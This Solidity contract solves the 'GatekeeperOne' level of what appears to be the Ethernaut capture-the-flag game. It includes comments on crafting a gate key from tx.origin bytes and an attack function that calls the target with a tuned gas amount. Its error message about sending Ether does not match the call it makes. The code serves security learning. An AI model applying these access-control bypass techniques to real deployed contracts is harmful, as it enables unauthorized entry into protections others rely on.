// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Level13Solution is Ownable {
    address public targetAddress;

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
    }

    function partOne(bytes8 _gateKey) public view returns (address) {
        // bytes8 is 16 hex characters long
        // uint64() is casting the bytes8 to its hex value
        // uint32() and uint16() are truncating those hex values to:
        // 8 hexchars and 4 hexchars respectively
        // So for example, something like 0000000000001234 will work since
        // it'll compare 00001234 with 1234
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );

        return msg.sender;
    }

    function partTwo(bytes8 _gateKey) public view returns (address) {
        // now the truncation is to
        // 8 hexchars and 16 repectively
        // This is saying that the truncated version of the _gateKey cannot match the original
        // e.g. Using 0000000000001234 will fail because the return values for both are equal
        // However, as long as you can change any of the first 8 characters, this will pass e.g. 1122334400001234
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        return msg.sender;
    }

    function partThree(bytes8 _gateKey) public view returns (address) {
        // _gateKey has 16 hexidecimal characters
        // uint16(msg.sender) truncates everything else but the last 4 characters of your address (for mine, it's 6f45)
        // The rest is the same as part 1 so this function will return true for any _gateKeys with the value
        // 0x********00006f45 where * represents any hexidecimal characters (0-f) except 0000
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        return msg.sender;
    }

    function attack(bytes8 _key) public onlyOwner {
        // IGatekeeperOne(targetAddress).enter(_key);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool sent, ) = targetAddress.call{gas: 823342}(payload);
        require(sent, "Failed to send Ether");
    }
}
